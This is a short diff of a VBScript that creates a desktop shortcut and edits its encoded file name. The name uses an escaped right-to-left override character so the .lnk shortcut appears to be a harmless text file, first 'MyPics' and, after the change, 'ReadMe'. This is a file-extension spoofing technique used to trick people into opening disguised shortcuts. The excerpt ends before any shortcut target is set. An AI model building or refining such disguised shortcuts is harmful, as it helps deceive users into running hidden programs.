@@ -1,7 +1,7 @@
 Set WshShell = CreateObject("WScript.Shell")
 Set ShApp = CreateObject("Shell.Application")
 DesktopPath = ShApp.Namespace(0).Self.Path
-unicode = Unescape("%u004d%u0079%u0050%u0069%u0063%u0073%u005f%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b")
+unicode = Unescape("%u0052%u0065%u0061%u0064%u004d%u0065%u005f%u202e%u0074%u0078%u0074%u002e%u006c%u006e%u006b")
 unicodeName = "unicode.lnk"
 shortcutPath = DesktopPath & "\" & unicodeName
 Set lnk = WshShell.CreateShortcut(shortcutPath)
